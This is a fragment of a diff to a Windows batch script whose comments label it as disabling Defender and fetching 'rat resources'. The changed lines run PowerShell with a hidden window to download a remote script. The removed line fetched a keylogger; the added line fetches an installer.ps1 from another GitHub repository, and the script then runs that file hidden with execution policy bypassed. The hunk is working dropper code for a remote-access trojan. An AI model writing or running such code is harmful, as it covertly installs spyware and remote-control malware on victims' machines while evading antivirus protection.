@@ -32,5 +32,5 @@ REM disable defender
 
 REM rat resources
 powershell powershell.exe -windowstyle hidden 
-"Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/MalwareDNA/main/rubberducky/DucKey-Logger/p.ps1 -OutFile kl.ps1"
+"Invoke-WebRequest -Uri https://raw.githubusercontent.com/jfrdgh/Quention/main/installer.ps1 -OutFile installer.ps1"
 powershell Start-Process -windowstyle hidden -ep bypass "installer.ps1"
